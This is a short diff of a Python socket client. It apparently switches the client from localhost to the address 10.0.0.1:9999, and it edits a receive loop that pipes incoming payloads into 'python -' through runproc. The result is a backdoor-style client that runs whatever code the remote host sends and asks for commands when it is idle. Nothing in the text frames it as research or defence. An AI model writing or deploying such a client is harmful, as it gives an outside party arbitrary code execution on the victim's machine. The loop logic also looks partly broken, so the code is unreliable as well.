@@ -7,26 +7,21 @@ def create():
         global host
         global port
         global s
-        host = 'localhost'
+        host = '10.0.0.1'
         port = 9999
         s = socket.socket()
-        s = s
     except socket.error as msg:
         print("Error: " + str(msg))
 
 
 def connect():
     try:
-       # global host
-       # global port
-       # global s
         s.connect((host, port))
     except socket.error as msg:
         print("Error: " + str(msg))
 
 
 def receive():
-    global s
     while True:
         data = s.recv(1024)
         if len(data) > 0:
@@ -41,7 +36,8 @@ def receive():
                     data = s.recv(1024)
                     totalRecv += len(data)
                     payload += data
-                runproc('python - <<EOF ' + '\n' + payload + '\n' + 'EOF')
+                    break
+                runproc('python - <<EOF' + '\n' + payload + '\n' +  'EOF')
         else:
             s.send('send command to me!')
             receive()
